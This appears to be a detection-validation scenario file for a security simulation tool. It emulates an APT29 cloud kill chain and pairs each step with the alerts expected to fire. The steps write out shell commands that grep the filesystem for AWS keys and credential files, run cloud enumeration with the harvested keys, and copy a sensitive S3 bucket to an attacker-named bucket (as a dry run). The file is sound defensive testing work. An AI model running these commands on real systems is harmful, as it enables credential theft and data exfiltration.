@@ -1,0 +1,178 @@
+scenario_id: SIM-MP-004
+name: "APT29 Cloud Credential Theft → Lateral → Exfil"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - Analytics
+  - BIOC
+  - IOC
+
+uc_ref: UCS-MP-04
+tc_ref: TC-MP-04
+uc_name: "Hybrid Cloud Credential Theft Stitching"
+tc_name: "Endpoint Cred Dump → Cloud API Abuse → S3 Exfil Correlation"
+
+mitre_tactic: "TA0006"
+mitre_tactic_name: "Credential Access"
+mitre_technique: "T1552.001"
+mitre_technique_name: "Unsecured Credentials: Credentials In Files"
+additional_techniques:
+  - technique: "T1059.004"
+    name: "Command and Scripting Interpreter: Unix Shell"
+  - technique: "T1078.004"
+    name: "Valid Accounts: Cloud Accounts"
+  - technique: "T1580"
+    name: "Cloud Infrastructure Discovery"
+  - technique: "T1530"
+    name: "Data from Cloud Storage"
+  - technique: "T1537"
+    name: "Transfer Data to Cloud Account"
+
+threat_report: "Unit42 - Cloudy With A Chance Of APT29 (Midnight Blizzard Cloud TTPs)"
+threat_report_url: "https://unit42.paloaltonetworks.com/russia-apt29-cozy-bear-midnight-blizzard/"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "datadog/stratus-red-team"
+  - repo: "RhinoSecurityLabs/pacu"
+  - repo: "BishopFox/sliver"
+
+infra_modules_needed:
+  - base
+  - edr
+  - cdr
+  - tim
+
+external_tools:
+  - name: awscli
+    source: "https://aws.amazon.com/cli/"
+    type: binary
+    install_inline: false
+  - name: stratus
+    source: "https://github.com/datadog/stratus-red-team"
+    type: binary
+    install_inline: true
+
+steps:
+  - id: step-01
+    name: "Endpoint: discover AWS credentials in filesystem"
+    command: |
+      echo '[MP-004] EDR side: credential file discovery from web service context';
+      grep -r -l -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key' /home /var/www /opt 2>/dev/null | head -20;
+      find / -name 'credentials' -path '*/.aws/*' 2>/dev/null;
+      echo '[*] XDR should flag recursive grep for AWS key pattern from www-data'
+    identity: www-data
+    mitre_technique: "T1552.001"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR — recursive credential-pattern grep from non-interactive service account"
+      - plane: EDR
+        type: Analytics
+        description: "XDR — www-data traversing /home and /root (unusual access pattern)"
+
+  - id: step-02
+    name: "Endpoint: stage discovered keys and invoke cloud API"
+    command: |
+      echo '[MP-004] Hybrid pivot: endpoint → cloud API call with discovered creds';
+      export AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID:-AKIAIOSFODNN7EXAMPLE}";
+      export AWS_SECRET_ACCESS_KEY="${AWS_SECRET_ACCESS_KEY:-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY}";
+      aws sts get-caller-identity --region us-east-1 2>&1 | head -5 || true;
+      echo '[*] CDR side: CloudTrail logs sts:GetCallerIdentity from non-corporate IP'
+    identity: www-data
+    mitre_technique: "T1078.004"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR — aws cli invoked by www-data with inline access-key env vars"
+      - plane: CLOUD_APP
+        type: Analytics
+        description: "CDR — CloudTrail sts:GetCallerIdentity from unenrolled source IP"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM stitching — endpoint process event + cloud audit event sharing principal within 60s window → single incident"
+
+  - id: step-03
+    name: "Cloud: enumerate cloud environment (discovery phase)"
+    command: |
+      echo '[MP-004] CDR side: cloud infrastructure discovery';
+      aws ec2 describe-instances --region us-east-1 --max-items 5 2>&1 | head -20 || true;
+      aws iam list-users --max-items 10 2>&1 | head -20 || true;
+      aws s3 ls 2>&1 | head -20 || true;
+      echo '[*] CDR should flag rapid multi-service enumeration from single principal'
+    identity: www-data
+    mitre_technique: "T1580"
+    expected_detections:
+      - plane: CLOUD_APP
+        type: BIOC
+        description: "CDR — multi-service describe/list burst (EC2+IAM+S3) from single principal in <30s"
+      - plane: CLOUD_APP
+        type: Analytics
+        description: "CDR — UEBA deviation: principal performing first-time broad discovery pattern"
+
+  - id: step-04
+    name: "Cloud: access sensitive S3 bucket (collection phase)"
+    command: |
+      echo '[MP-004] Collection: targeted bucket access';
+      BUCKET="${TARGET_BUCKET:-cortexsim-sensitive-demo}";
+      aws s3 ls "s3://${BUCKET}/" --recursive --region us-east-1 2>&1 | head -20 || true;
+      aws s3api get-bucket-acl --bucket "${BUCKET}" 2>&1 | head -10 || true;
+      echo '[*] CDR should flag sensitive-tagged bucket access by non-owner principal'
+    identity: www-data
+    mitre_technique: "T1530"
+    expected_detections:
+      - plane: CLOUD_APP
+        type: BIOC
+        description: "CDR — GetBucketAcl + ListObjects on sensitivity-tagged bucket by unauthorized principal"
+      - plane: ANALYTICS
+        type: IOC
+        description: "XSIAM — IOC match on bucket name from watchlist cross-referenced with discovery burst from step-03"
+
+  - id: step-05
+    name: "Exfiltration: copy data to attacker-controlled destination"
+    command: |
+      echo '[MP-004] Exfil: simulated S3→external transfer';
+      SRC="${TARGET_BUCKET:-cortexsim-sensitive-demo}";
+      DEST="${ATTACKER_BUCKET:-cortexsim-attacker-drop}";
+      aws s3 cp "s3://${SRC}/" "s3://${DEST}/" --recursive --region us-east-1 --dryrun 2>&1 | head -10 || true;
+      echo '[*] CDR + TIM should stitch: cross-account S3 copy + destination on IOC watchlist'
+    identity: www-data
+    mitre_technique: "T1537"
+    expected_detections:
+      - plane: CLOUD_APP
+        type: BIOC
+        description: "CDR — S3 CopyObject to non-owned destination account/bucket"
+      - plane: CLOUD_APP
+        type: Analytics
+        description: "CDR — data egress volume anomaly from sensitivity-tagged source"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM — final stitched incident: cred-dump (EDR) → cloud pivot (CDR) → enumeration → collection → exfil, all under one story"
+
+cleanup:
+  commands:
+    - "unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY"
+    - "rm -f /tmp/cortexsim_mp004_*.json /tmp/cortexsim_mp004_*.log"
+    - "echo '[CortexSim] SIM-MP-004 cleanup complete - no persistent artifacts'"
+
+author: "Henry Reed"
+created: "2026-04-23"
+last_updated: "2026-04-23"
+tags:
+  - multi-plane
+  - stitching
+  - apt29
+  - cloud-cred-theft
+  - aws
+  - cdr-edr-correlation
+  - hybrid-kill-chain
